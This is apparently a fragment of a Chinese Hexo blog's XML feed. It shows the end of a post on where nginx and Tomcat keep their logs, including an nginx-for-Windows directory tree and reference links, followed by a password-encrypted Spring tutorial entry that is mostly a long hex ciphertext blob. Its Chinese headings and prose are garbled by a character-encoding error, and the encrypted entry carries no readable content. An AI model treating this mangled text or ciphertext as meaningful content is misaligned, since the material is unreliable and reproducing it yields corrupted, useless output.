id="linuxæ—¥å¿—ä½ç½®-1"><a href="#linuxæ—¥å¿—ä½ç½®-1" class="headerlink" title="linuxæ—¥å¿—ä½ç½®"></a>linuxæ—¥å¿—ä½ç½®</h4><img src="/2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/TIMæˆªå›¾20200219221127.png" style="zoom:80%;"><p>ç”¨dockeræ‹‰å–å¾—nginxé•œåƒæ—¥å¿—æ–‡ä»¶ä½äº<code>/var/log/nginx</code>ï¼Œé…ç½®æ–‡ä»¶ä½äº<code>/etc/nginx</code>ï¼Œå¦‚æœä¸çŸ¥é“ä¹Ÿå¯ä»¥ä¹Ÿå¯ä»¥find</p><h4 id="windowsæ—¥å¿—ä½ç½®-1"><a href="#windowsæ—¥å¿—ä½ç½®-1" class="headerlink" title="windowsæ—¥å¿—ä½ç½®"></a>windowsæ—¥å¿—ä½ç½®</h4><p>ç›®å½•ç»“æ„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">â”‚  nginx.exe</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€conf</span><br><span class="line">â”‚      example.conf</span><br><span class="line">â”‚      fastcgi.conf</span><br><span class="line">â”‚      fastcgi_params</span><br><span class="line">â”‚      koi-utf</span><br><span class="line">â”‚      koi-win</span><br><span class="line">â”‚      mime.types</span><br><span class="line">â”‚      nconfig.conf</span><br><span class="line">â”‚      nginx.conf</span><br><span class="line">â”‚      scgi_params</span><br><span class="line">â”‚      uwsgi_params</span><br><span class="line">â”‚      vhosts.conf</span><br><span class="line">â”‚      win-utf</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€contrib</span><br><span class="line">â”‚  â”‚  geo2nginx.pl</span><br><span class="line">â”‚  â”‚  README</span><br><span class="line">â”‚  â”‚</span><br><span class="line">â”‚  â”œâ”€unicode2nginx</span><br><span class="line">â”‚  â”‚      koi-utf</span><br><span class="line">â”‚  â”‚      unicode-to-nginx.pl</span><br><span class="line">â”‚  â”‚      win-utf</span><br><span class="line">â”‚  â”‚</span><br><span class="line">â”‚  â””â”€vim</span><br><span class="line">â”‚      â”œâ”€ftdetect</span><br><span class="line">â”‚      â”‚      nginx.vim</span><br><span class="line">â”‚      â”‚</span><br><span class="line">â”‚      â”œâ”€indent</span><br><span class="line">â”‚      â”‚      nginx.vim</span><br><span class="line">â”‚      â”‚</span><br><span class="line">â”‚      â””â”€syntax</span><br><span class="line">â”‚              nginx.vim</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€html</span><br><span class="line">â”‚      50x.html</span><br><span class="line">â”‚      index.html</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€logs</span><br><span class="line">â”‚      access.log</span><br><span class="line">â”‚      error.log</span><br><span class="line">â”‚      nginx.pid</span><br><span class="line">â”‚</span><br><span class="line">â””â”€temp</span><br><span class="line">    â”œâ”€client_body_temp</span><br><span class="line">    â”œâ”€fastcgi_temp</span><br><span class="line">    â”œâ”€proxy_temp</span><br><span class="line">    â”œâ”€scgi_temp</span><br><span class="line">    â””â”€uwsgi_temp</span><br></pre></td></tr></table></figure><h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><p>å’Œä¸Šé¢çš„åŸºæœ¬ä¸€æ ·</p><p>å‚è€ƒï¼š</p><p><a href="https://www.freebuf.com/vuls/175560.html">https://www.freebuf.com/vuls/175560.html</a></p><p><a href="https://xz.aliyun.com/t/2524">https://xz.aliyun.com/t/2524</a></p><p><a href="https://www.cnblogs.com/llife/p/11478952.html">https://www.cnblogs.com/llife/p/11478952.html</a></p><p><a href="https://www.alibabacloud.com/help/zh/doc-detail/84813.htm">https://www.alibabacloud.com/help/zh/doc-detail/84813.htm</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> æ—¥å¿— </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Springæ¡†æ¶å…¥é—¨</title>
      <link href="2020/02/18/Spring%E6%A1%86%E6%9E%B6%E5%85%A5%E9%97%A8/"/>
      <url>2020/02/18/Spring%E6%A1%86%E6%9E%B6%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="æŠ±æ­‰, è¿™ä¸ªå¯†ç çœ‹ç€ä¸å¤ªå¯¹, è¯·å†è¯•è¯•." data-whm="æŠ±æ­‰, è¿™ä¸ªæ–‡ç« ä¸èƒ½è¢«æ ¡éªŒ, ä¸è¿‡æ‚¨è¿˜æ˜¯èƒ½çœ‹çœ‹è§£å¯†åçš„å†…å®¹."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="æ‚¨å¥½, è¿™é‡Œéœ€è¦å¯†ç ." /><label>æ‚¨å¥½, è¿™é‡Œéœ€è¦å¯†ç .</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="563b8d1e7723046a89aa633257305f5714226f21538f0db5afc62e39ca1acfa0">350661b2974115f53242674b356f3b8a42f648c389fe6ce9dd086c5d24c940538305548e0c724e64fbe4fd4f661fdc5bacc7858cb28ee4d6d44e5ec47b6e464d31a33970739aa604aa07c5ba41d61a5ce1a27f8ca3fbc311f4424db7b4f3d5f3ae995486d9555c4a7d8a92ab36868334b15713fddead0f613e89a3f156808e4b4e6616c24b86927d84fa418c4f98af1b5998bcb80616b46871b7f0c35ebcfbfe3c7f85376d941c859af05d19fbb9dea676b8d63b6669a72bc2ff87dd6132ceba809fa8ebbb6958636ec26f45baea199f885f04e51cbda9354239a507385b7a4002b145b964a5b5b22e453f56425d482dff899ab5e7a7f950e94859b42e5ea55bdc2155228368c8e3336f321ea0944dc00b9a2b4a9de28ff1b01f4a4b548047f5365a80f3a0defb3e88077a7f32d75e0451139596904a5e35429b3a133e1d070393587caa230b305285e48d6de6de49537b99dc7ee649d417fe5ea36e527a32f6ed746e2335e6b1b5a8c200183153937a23c97f8041ca270d5ddbcfcb9ce281217c7bdf7d39ac4906602da84d85ccc0721c5d912116cd5069ac98e798679b1be8659b688aeff7108367a1b613068495fb08ef80bec3e565df8247a25983ab38becd73e33f6ed98bf698f6f074561edbce553a3ba5d90ed0b9374494230733343c7856757afd11cee999aa1c17e938d8aa6327b999a9f71acffe6578faa8d05e13bb2bddde3e7c8e85d1bdfe7e0521e72f729cae979c2d9132726405499c96857f15ad7ba5c9d495d3d230d57e4daf835ce6b09cd01622ac7ab578470173cbd82468c417ba1f6cce948a59f57059947c7d67de2bb4e5c27f804361904b3e5b0e4a84c3d069c9e1cc1c01a2c482052d908459b2306ce148315232ff4e6ec3044b694c0703d4515805573e3438541615e5fe37fbd0c31852db8d54ada0a09409499bd5d0f79a83e269e1d0a801208987b67a5830a7b184a3a105a722006c2c376eebfaacdb9f8c41823c08b175d21beca68e01e9c0162e0a463ea176bfbdae7e9e15df42869c763b95d2a9aa7609211443d15cbda2dbbdfb76c2897c4db1684e5da8180bda42612f984ed8c0e3cd3ddd7639fc5e65eb85abc51bcf1abc6ec9eb724de5e7ea16c5bf89474c2f062e97cdf670ebe6328feeb8f45018fb8713941af44ff7cc376a56eb4ef51f05e4b1579a3fff08110cc04d479857d88d93fc9f237e347a2197e6306486a86334c035b165f7486a23228d78e83ffdea32a266abb07534dec84a54acdaedb7a24dd61275a8f268a42dd7e1558a64b4857f1bc5d942280a0185e063fee559965119eaf0ce1f308bf6521e12a7606a9408c675dff42c3896f320a85baa31b6e0486f705562f2e0deb0009a8d41c73ee6269de7f609ad92a42c8d07b15c693305a0889e747cc83827d2fffea0de3c2a648a487ec262bb881a2da24ab5ee0104b8ec9bdc1582c652ca0009da585fa41ecf3b1a3d6eddd62122e596685d363933b4c1c4addb4c273e67e5ecd2f6ca3d0d798efc87bb4c110ece0f180a468f16de8fb61401e759a6530e26b6fea75d2b0fec2caf16480decf66cd74187712f4d07362491b1503d2153072b8009c1fd87a776563f45f13836741185d2bd96ace4a883f65cebd21c120f3adac5848f797676de7d74eeeb6614035b33617a4bb9bbb57720a38ff337981080387f9cd70fda9330c97cb411b22c1ee59aca561322e3b535536c117dd58b25a2026c869d92cb0abbd73c6e81218263220f48a725426d3c536181cca5cb0d0c227031e1fac9737be751aff21597e9d5c65d04baa8f0898840c34f6fa619422295dde669086f3a16f463fcbf59a3d0e9b10996b9180ade7dfe81fbed4bb9d3b5c76bd63ac7de097561461f73c178e968a95e0a0ec4ac775cf3a6ca989b0eff18986e423e942ea43022c1d3de642c1354357ece430cddb13fb1610ef7b66f8108d9ca0d352cca7f74a8720be1e0d6bafa883d60cd47a7be961c9e7b5303b69269db18731296f940d83e95cc6c8c01ce217c913667fcd048b4bcf220e9c1469a4efb12a3ddfdf585ecc46ceecd56e2ffc78cc976ea122a511442477a5782c37c1c2aa4c7160ef49df714df63d33797e474dce4dd0a6e9f870953864d88cb7410b2403eae07294ec1327581b6a70eb1db7e3dc4a3ef384432c656e6a15e90b7408f2be4b9387a7d91642a2202df96a01e026e1ddae3dfc337d37a4734f660a5eea358057517e3d4e1d10cceff231676b1d7595136895b2256d15d91796d327b85250b287558606aac9309062e9bcd68412edbc31c397788a4b87e6deaf6df864202447a88cb2a41d1099c638b3165090bedf64767d4efd431ff7e7334e8773b3d32552e5f5bd076176e74dd30da236476e738bbcd82be9f700c82191b60a58d31175fe07b19cee76b248c74419e83d9cde9d793eb094315ae43f1fbc28db6ca01b7487e5ceb7d8aba2a559f159951bb3009146a1566ec561780390d5b86f220ff1cb6a18fdeb360167f5fc5e5d15f35c653016b1a86f90c209dd0c785de3177bf2c5b05f82dfeadd36630aef7f66a1b5c8102f4b0d6c865c9e82d5a585881b48b5defc60a61c5b84e1a2321123ee0b0cc2935dfb379f520cf80844e54adee867cbf51dbabf53d2724d4bcb5f2c7a6ecf5fb814330160b08151b1d8e44dfa26acf0fba0dcdc58c545f25a235818e7ee140248c1884b1e333f5ac361cacb9f149c7e028a7ac38f8d11f8fbc00db4c13f2747b8596a9c54f3bdc9de34fbeddacc8ebbce0066b8759bb622751adffd00f3515c37bb1b553551e56855fa00e73e5dc50097b0d32392eba81f5578ccc29a734e2760517b5e1905bebb2e7fa5ba72d3f142b96378e00e2b1e5260cbffb4194639c599c72b2283a6f4f3ae96ac2261b4ab15cf1ad21aca41dc27e0c66cbc0224781ffd32c7a9f86513b820b88ef1a820dee1516e65608ea129b0bd0bcf34a666f9f963e4864371d915361a0701bdd6e43f39c66ee9830efde6e8fecaad9565dabc9fa49e4f236e234ee9e2b96b11e8188671fd95a0b7885a7559ce986109eb961b1d1413519144b96b2df66ed386006fcfb8744f539f03449bfbfd35b5e9060f1b8252d1375a05e9ba6e2fac657489011a324c7e4aec0e76478beebf95f03b2ab2fdb0c060c8d228094d0c42d76c5358c26d5cc1dd6d6a2b117c49b7a7b4e39010d4c89c8e525a4db44a77785694345aee3f699b292ae8d91bb36ab2a03cbb06f401f79caa4a4dd64e8960da6d147ffe07f3248b1678a630acfd7ab14e29f7de2fa215459341438e7aba79c8de8c3a7a41dd2d8efb0c93067406afe8ce1ff4e0e269e05a2b7dfad2d4ae8526876818aec936c31b03f5f6cadedb4469a68d4eefb85c644458c8f520d1c84122e8a99da31a4cdf7bec4699a425c0a36a54241f19951edcadf03ed553983a5486a4f35efe0d11820168d976fe5efe5a187f6f21bc79be92865d485f3964399a3fcc235e6bd600218627af0d7d1c8a9f4d4cc9d127ce43d2a00dc73a25ea4ad4d12aabb81bf48ed5ff76d4ff49ec1eeb7214c78edd1d69dbac888de3973e4dd0eeb9094346ce7a97826fb2a0c85385bd384a7321afbcdff3cd593996b6b0ad4b84c5199039a9b6a1cbdb573b5349628985aebca79812f883e1458ede5f8beffeaef2e4f46a5962d800cfa1b337c3f163f800c1d730f0aa7703ea82db4e113d9ccc18ffc885e1c0aa0f88e1392a5e7e001dc9adf95b826021c83806346d4ddc9f06386975b9534a0c8a5abb8346f0d42a80aa81705ab7165caf866e5ebc5323c222e92b6ae113336a9e6c987b9c149442c72b3c3662e1f46e370f6b5f24dfc7c6dbccc2cff4ed4631dd05209d6fbfa22c2fd984486916edbbb8da3616606701bc2f06364c04ad2db9af8fb40d8068dadc1df347f5adf62299c63db3af316f9054d9c4d5aec9918be31b6ae3f192d8077f18318188da27788d842f7f6dc5150a9ecbd5b9d2057bd79e09364f4d0ea2eb4330b14c6ce2bc27640f52ce939a6bb7e58bc135da8ab96359b1e61d917a2834b0ce30c0a92b7f2c41eee97718a084975033b4379ff61920bab974dfd2f7cc575fab82341ae81863743c2ace4016f8dd3dae1811917cadd41119caeabd27252137c3049c3743c4481cde34e9b1101fb2153c92dcc0a606fe949a0b96a7bafec22add4101d1017a20562d9ef5cbaa8899d27ad7d6df46a5858c093030514c483e4eae3eb8762233aa4f3950094cb43953d77f86ba6d1696650f375c3d52448d7634a2091381bd9554be211d17cb74a7b9fcdeb0dfcd73ff6710eaba8104452823d2e3bb0f8ba43094b97c9ffd3edd14076f2631bbcbc4eebac5892794897a0ec27e9a920a243823c6b9ab044115df30756cba23bb7e19ff18787a2a11d7a47cb78772bd4f99634acf8aa3dd5dd6176f25e6860d68b1bc051b7e7b5c32b417ba48a4f6b133af779354625af0517fd155b0562984598b38ce9866ffc562f56f4f100f918d36bc258cf605b547a13663ed72e274e40fa30258321307b5ec6ec803b74eb8bf8a444ee5080e2fa06477d8486a2fb0c39fb32e358aaa4862be12f2cb1a2b2cbab2f7253d648c53a49c0e1b5935f90e8dd845634b9da664c0ae3c034eda50dd3a928dd05f652a3028a641f9b99732dcb024dbf316e9f69b6903292ae9ea59d433cbc11a32a1243ee35aed314b34e6b9cf31c8a3a2f88d2fa6eb3c4dd801f53fe95771221d8ce46de656c9ccc3d6ee46290d38a57ebf0b4e4564b37b4ea1bb7b5a288c647ca0fb5e5ef2691fe4109c97396e9f6abb42173543a0a6087fabacd4ae740366034e7b13c1f3bdeeee95f447b6645ab24bbd6ce0d87d1bdb9c25b38a1c629cf6d3b9f6c811e273d2c427345f132b4e8a3a2e4fb5be500b662245e163b1dc1252ac0d6e9a5927ecbcdc4988cf7a7310aa91b6388134f73ce55d93ee74fe2712a77e09cb88392dc54ff14d7eb9f0778e1de686114af0119253f375cbf15b9a3f9696a10f8653c9affc2a099cc2dfb9687d4cd05506fa96a4474445ff4a906b79771a6c6ce260b3bbb2b24f0db4ea17722bf43cc6df3b30a16ac2f41b2c8ce282eea6a823117723439e5b6a2acb78e58724983f7a11dd964273218efc9b3a29ea3146f07cd57243b9cc76bd2ab48c12522a9e443e52e3a21b3031d24dcb49990711a60bed9fd56c47080ccf3b16d0c3e3a69d53d5176ff5238b17b515215d9982e339ecc9b33c269779b1209c204ba7eb1300d1dac27c1a533d98bbd47b2e99030c8e65440130ab765a834a0aded69791a47476ef194a22d52e0dc8c6a511dc394db7af7c984b4d931d33908d3e4f41be7f1b9a6b5bd71343d7921770f986b09881f868c8c6411b603136d7bc95dd5f2e198619a4debf1b3fd867e9f032d79e13d7376a60088e33cc561ccfee22b29543a992fddfa8cb2aaca89b590cf8f12839d599f28bb9804dffdb66f4ec05ac9bbf91539fd4c41a096fe734cb00576fbe5c3466e0b294420654d96c5c9d9f51e3e5b5bd1dcaa93c45085778ce376f4ed220567b1cc442eb19d49ee488aa5574243d8cdcaaa9b34b3889288e986c51e3d685fdfa01f5f0c278c5994675fa6879c9ebb03048968d79623497c773f8d7c3197df7bcd818d57e17ac54fd0bb3af7229d63370b5bd71eee609f9a3203abee402e779c4902d455a493784f35a1dc142bbbc796990017cc13e67d14afee1ad5dee236c804604f8e23bf3ab2eea77030a573aadb8b518d25a9c1137996240ccee09791bebfc854c1c0bf37c2f19fd4afa09a717b10a87888e756cfa6697c2b5c42239dca652d902a79902981d02be6a797edba720fd498e83b3f6c815a347a25dab353978a21888078d9b0f05ccd75d503a58d752117dd191688f8a982c7283c62bd5903a6aaf25a9337c85cc069a2df238a601aafb68f6ef03ca76342feadb504ed09627cdb3e4c66e55c1b9a944e9b88b6a98633310162d5c657383db2cfb19940b5bd28136aefeb0669a073646b68ed9e64f899ba05e0f804b6ded45ea9dc93413adac8bad4556b49f1cafa77f23d87c226f05db6b5dc9fbdf06d917b37db2c6d8cdcd04e88ef44a46e34b7a7ae0bc4d10bf44a925624b9d41231509643a96dd70dcf80b09b5e49032d214a623031265f35d43177e4a2d9871031ed1f08bd395724112a798cf8b3e28d82482bc7c267c707ecd841a0f881d6d03e7f88287eb2088c29ebcf2d7ab322b9717eb2a79b98be82cf57cb2177eaf34fe6ba0dd02a422a7a9b4ce637298906c0c13b6e35fa3e8e819adc1ac2ef090cba7ce84f5816d3761ad374a186cc8af21cfda4c69f615d67b5947c68dcb53a5eb387eaa3ae3226461eef00db01d4531de55a3351a599fb55fe17c8c66235e781df4d26f0fc00be0284bf7b4288f12bac6bc75453b474d994748541dba820400833b91420337f7336f778aff90e854702c5186d701a0949ece4351e8af5466730a780527cecf634579af913507f716ff6c15e0ee079a7909bda2ff24119aa1e46b0806a67aa54d57190fa20af05daad63be50f43da46fe7e69b5eeaacc943d8693ccdf0b969901e3bc459ab220d247d440ce0b7560572b5ec25f4520c5914d37bcc1ce7bb4f300dc9077155ea1296978322838c23707b49e70f3d9161d40f89a8ce4a425744b9c9d5f0090c6574b51f8cc567993718ad831b9c852534c234b5a2773cad23a906419112fa034f952933fab8ae0be2001e5a5c440e3aeb78a3c7da2bc2aef9403732a7c638d316c8375445e79050fe2c690ac140a8d6cc62c83a6d435cd57f3cac44e07ee6aa2fae3c92107033605f124e3c8edb5ef9b7c8ddb1f3458189677567e27e25069d9f32720671cf6f6cc17bdcf214598599d7cfb284a517af285b08c92746264d778a886ffe52a0cdeff0bd8b3c86eefe466ea2a751ec307436e602f4dbe93637d2171ab2b92d78be880bc76a953f451d8ef4c55959e54a9b8818f9427d7576f2f4ad57237ca13e64eca3b81872d424b27c102c6383f38d37cf5b53f314ba40797e48eb8949269dc2b99f92a448543f376d94ae50841da2f363091dcdd28bd0256919e8034fd687b070ddf9a97d51996806685cbfb540629c582a548a5085f1efc3a67b6d61ba2bd9f04cffea1faa1eafad5642cfdde19bee8976f899bdca64e23f297501b48873e63b0816285642cf131e9624ae0d0c852ba043f481274780037ad403e2d8fe9fef5ffec16806b4ede7bbc5b15347b3e4146a3101229fc93daa067850dd27da7fc5e8e43d85b6e77e27ca6745ac6cdcad9a072dff779c3d57b9c40c63559c5e3c72a6411cabab427a138fe972fee9fc457e23cf259a45d1ca3abd118ce717401377f5d849b6428d61f122fe7f1c2d80826e2238c26585bb082e47293f85ac282142c18ff619473520ca85d1c3285fda4843b29f9afd43401085d001650e837a47cd1796c1e704b99eed5387f708095215f5bedee1fd74ffa81617e75c00988db3dc7ae5094d4c4fac830592ff1805a91d3f215bb3121c01e3897dd4905045698543e588720f01687616ff870bd05db6d9b15d8cb93dceff6b6a2dd5842f36ebff82cd6b00f933fd679dc4191d8e064dd1c1509af08b7cf59904a975491ad123800f44f40d31c33676409824d347cf4319e1ce7d45190243c2611b38061cdd9184c94fcc2379c00096d94d2778062893ff8b54d333c69517f523d5ca6156be39d4e7928edd83e6577bc996b0aa0817185cba1389a976f62238cfed8d43921143680bd9e63c30ff7b6b035cf877866609fe962cc72347bb18c30ae9660ce1c2a1222d042f3e487db8991317fa07456a18240632e117aa5bde1d7cfd5c596f8f1877fcbc069328d6d367111092a0ca000a1332a1d4ec521fa7f514b75b4e94696421e8a59f47d45e12c86e6c0dff61e4eadb50c248a30e8f8d920e13c45bdcc81782adae61384c14811e46d80388acdd44fd4f30c7fd9880a811fbf31e5e1fead8b5f3393e8eaf8f8064ea1cd435d3c71b0d43e329a0c0fa425e28af61e16d0a29c8b2fc07c53caae9bd749978f25009476e45f6794b23b50515b27d6d39a593f41939f9a58a19498a6262c840cdf0dd7680064555190e7adc2579de47160d10c6ef9bd41fe54f1f3b9d0713b07fc28e8852af9c68998ebb188d4a789eed10db26c4c5c74441958065890ef5e8333b3f4ff586bb3fbe144b12734d78ab2e72a4df312525da64a402f191ad8bf2e60cf0f352f9b3b704752f8ac3e42607d776258a438cd64ae3e6059b7b2d4a64f640b486ed056c44bfd8016ab5e5606d5ac1367d5b3c64fec97a3c3faf077dba978c71ec0e5aa0814f128b036efc08a46fb68b285db8c4033b3297af72df262e050d9cd0114e4602609c44b03bade6e8f111d8504ad2ace54ea0070685c30a35440b858c78d8dc099e991c5b5e40f5ef238171041bf001246032885e4f2e05242a49212e76e0bf0927d70aab0859a0cb27e93c4b31265c4a2b3dd17a0153d251f4e5b8ad48c1e4b9b0d4e8a0a9f7a193765ce01d91533b6586221f3d8be57753f7cc3366f2508656c0c007303c5d9c929aaea902a7ab9f9e62ac8a1a6eb80b1ca9b58156fa09f12b3403d67cc60962c4551be632dc23ad6f4159955ad49465f95865e6640aa784d42175fc7f3c647b75d2839cbfc52b234a8feebeb09ceedb8c8be42cb0be83500e5ba3cbc6dcd621c459b14c6a161aeb558539a824a45dcb627a9a4d6a66f66a5df8fc08e67da93eea079bd5ac80cab2a65334eb227bfdae9878d1678bd9a7133f143aeaeab0dbe634f05a5e782648caa93d4503882f53b34676f3c9dccac07833abbf37930cba7b0bbc8e62a2bf2cbc2e653b57393422de29ac6841097fc528ddafddb5511d65030cddb2fe7ea4b12b75409f1f8147fa3094c4839c74a83b31e972a9f983041a674f975b3abb8fe3606677bb530144cd29eca15c8d661523680dcdf842af2b3afe22dd62f254d7b0426142ae493d73fb439de1e8137e5297f661029041270afd2d442e9ef9683085d5cd560b141b066c0ef7c7e310b90db98645a8ca71af3bea6ef7cef7a20707fa54beb3c4068ddba5a2f7f363cc5c93d3495f5b9234505bbcd6774e3b4baaca0d2a3d11f425f10ae95bcab1a2b5f216e6ccc8b71cb4f42f8e08e2150a3459452d53aa3423fb176351db25d7e12da4f089eb2c0345df27b20c34338564dfd5c84997c59761689dcb3e95f81072b32e398273be4e362ddf6891127b3337e30362d1bdba98f8736b64cb9f24958425bbcd5fed24da6bab301e2114d6665e3db3da91d46f21387c7413fea4ae06ba15c35310916ce6f24737d0c75644c3191992f1b8733837e481fc38d9bd8683cf02c10489ce11d61b0781f1fbc784bc568dbe7ca281482e0240ea356188ced95c01e2c09546412b1bb0abaf560ab327414dd816b21856cbaa642b34b82c682fb3be101ffd3ffd0a0c797e62eb9fc7ffbd4b58ab9da87b40887918a5548cb16f1d9c1336863cc752ea253731f6582b15b7a8a90d9c9f93571bd5c935ef9d463235fdd4e735953539f43957c30c1e2f83c5ceb3c6ee945d674b8457574b6608540622ad31de523be9a92efb8b6e0f0fa49276c44430d8af637585fbc8355034d5503c252caad9bd29ba3de98b715e240fdaee95ffe29c182e3277b3cf36e751da0041c029ddd0f37648616699266f5b14448d7aff3902c33ff73e161078dea490833f336d01ccb9150f173a75015be069f3f2c63e13192eb1b7f7b27d4c7aa72cb47b33b0f451a02528c303b0f388cc289a187d9f88075399b8af9c31eb70387896c27bd74d97bd56e4fab606e95c09a619a829d6aceb2a1f7572da57b52bb49944efe03c84eaade26f66adaef91b7d0a76a23ed8b5ff48ea060bfbbcad62c818b033c1603ed23990ce00c6ab9f859435665ff035a53fa545f0976273315a973462699b4d5f0c45c1c41a8f03d60ea6eae84ab961ec6f31c02193ffe014e28ac42e49b5d3f81a08ed84ba3cf2afed36ea0c23e90ef467628af486bd2cc014d8a6147f368628f2f511875ecd4f393192c00ebcc55ba4d5efe05ab70be761c8211a9439e79a80f1d89fc2775eaf95c63df73a8c6301eaadd0a3ad3b9a6359a9fd92b1e69587078939cfa76a0723ee7795f38e553668a9030317b21a5a4b2a1480caf7680b03a6aea8f63a2b07f969af546b951b8764265841b5fad6431f02dfa67a28068801d8bf86abce8825a53f0d48e60596d2f4ca62da4411ba5ce865fde571c3e0782e6cebc3baa47561f2d5dac15ea932a374a624edaa564e84f6a747144a163011c937b2b3bc524998f0d01b06d2d6766882cb1eb6fcb320278a99f756681b891a47a53438c9900269e4a211be69426abac62f81ae68362e567eaa4656433a55fbdab9a29eb09863c9f944f1810319b19206b05336fff976bf0ab0a15f2cc67c6c4ff40659331cd4ba58188a111a5feb8146549bb18fdc499e8f36a20a15d0a2b65a26fbe4d9fc73573f8944a9b353a98e9adeca379be4dabdf55d70f399e41aceb7f6476567aee90c6b7388204617c82ac51fbfe6746514acf149a960d24e7c8779e4339342b6dc05c7c981bdc15c328050f6fd256c894bb9eaa9221087837f5e1b6b9d3d7c9cefa8889a7190b7fc39b71777f8299599d3af6d860bd32ae4404c3e7143178753fb313c746ee54088940d619c21f8528e93da3ab4894dfd4c2f10682225c98e4c260ea2764757b4f152b670579b7b340dd08a44b74ddae8f003730764f2d2a6ca6c164527ff6c749bfd33c8deaa2cffba3d13532ba8f3832bf0524b1f5205ea5cb858cefccd1467cfccd4fd7ec554ac07befb196593b488e1dff9b3ff04b3544394c2d1fdafdfd4874a58a42c72d71b7d8fbcfda3b8e71ef46fa320b8630868ed79b30e9064b7241db1184ba629a03d24fb5f996c5e3d99b2730c14240f16d8a01a74cde9475a7e160008436837b428616b3bd4e6ec5d5389b0cb737cf66f88046ec399c96c299580d58eeefcccd8cc49a2e0707a98412a5715fc3685b763dcc66a0a6885abc77668372e33ccf25288840bd0cae6d18dc9015a982932e7e5781ff2ac2182a1f72a33256e294d2ada84b3165705bb7a89143f3e20ac6b677540eb396f3536fe43a4f0c5adfa81cfae3fc23f534cb924c921409a3c383517db655162a437a83411a2efdc0aeb0840dc356a20877b6ffc4ccf64b848c78a55e941ec075994457373df4277926df15c41847d49347d4b80ac1fb7ea324035a976610fd69a57d43c1b62b7377d00649a4029f46d2273fc6473a20663966de32955407f57fcb7cb0bae05d5baaa3a6082be6604a328cc740cf135473e8760df7e62d32f70f5994fbb4890935672e0504b2e5b919a545d81172001ac611c3fd9a94938ff7e15571db8e4730f9cd5be5c87503a08d1d145255c650e56458ebe074845f967e1e64bad79a0854f9906ec8b0641293b5cd60ca813fda49b8dd25901a453230fa3f6ba8ac7021256b19dbab294ffde8cf73af5f0ca45b358cc1a8a9614a311f3846696959df23762ebab43014f3a8ac3c204b2d9abb28b325561ba7f19ce383398eefe099d820e7752a1608600efec076175ba6ee148fa0d15e4db3d7f0bae93a3ddc6736f7e1095c4ae768f8116c78ffbb7b350c398f312974bf838a838c319f721fc9ec1a7e28740f86ef810633630b2e895a990b2af27f67e45a85d7daf79647b11ffaffac4a1c65005939db20123e7ec7b255c06d80c15a7de14b717cf39654810800b200598143ebdf5f536f16eb2872845f2961bc8db80a7188de3c7df9130b8cb65a4cdcd8b6e9ee367f10847f158fb28421958a95cbfa01da55b974ffbf95517a10d44fbee08516baf8bc93e780f60611644f26ebb4f76cb32f9059d3a8955834135a3dcf6c5e017f919c18f9fe4434ba90e8c50b3e4643138b883b89f89f91846530e0551e66b350827dfb652c2fa02b218fe199daac00f23700e717ec6267ab50d024ad92b744befaf79f1300bbaa99902c639f7a9c4dec9f89586137e1d57b62630073f1dfab8c2223df4ec219f78e3707045f0757bdd500e26d47a23c1e0bff151c7557c2aeedb1bc8bdf435d84de5cde2d3af2e6b140e46463d4325a5805215ba3f401114d896e93bcce05851a3546e96c6f4b6e786183a034640a7819ee8031cffbbc37e6cb12b90f5caeaa6636912a24f80479f392eff5b1ec5a81c097bc1599bd308fa4d03dc142e5d048f376ebae6f5932131a573e1f342750bd44960e7e1b2c977c475fa33fb47011334b3a8a25d96fc135f0bcf86258864bfdce9e83117cdbec5b2ad192ddcd0f5f90587f4d2ea1bdd2c10dab123f7359c10d6f91d9333ee3b28067d0038daa922feb345bf025c0693ae0f3db3af95c4dfc3606ac25132170e5f51afc0d4e04a7c311c69b5538d582648392d2fed91401bcc1dcc455c4efe786635280cb10ffe2f7b5a5e84837612d8beaa3ca84601814ccc70019875a6e568a608874adc537f38c9c730af932468b9e49e20c2ac522d1e73dfdae009022054f0091d080c979425e1cdba99c273f21163e8a5528a9b2b51d64e0e3aa3b303b7c530e0cd55c3c6b7c1866c447d0111f52bfed7c50480bb0da3d4ba86b489f6dcdf94ff4416e3aadc23058115810749a9e1769068a02a17391a6d1a29ddccb77cf92f2bbcff7307e82dec923eb55856d7426e25f2dd8bd76545d24651a02e7aeefaa903546aef7ddfae2dd8aab30a9cbbd9a3b0fdc4e80f4de98b1b8d38319b5b793b0ad77379867afa8c67b17f2ca9df9b34e4def5b472ab688ffd41f486abe0a7a9a3cd94680ade8fa4a9fdc142424c2e0f94afe365874bfb28fef550a82cbba8150f51a9be7534a4089c572c03ccdfc9bf8298ce22990fc4291b44c1a44d39523b8b164e2c8e1654c3ed5fe2d136cdd88414149d3494e74b131e3805986e8473f33354f21ee57281a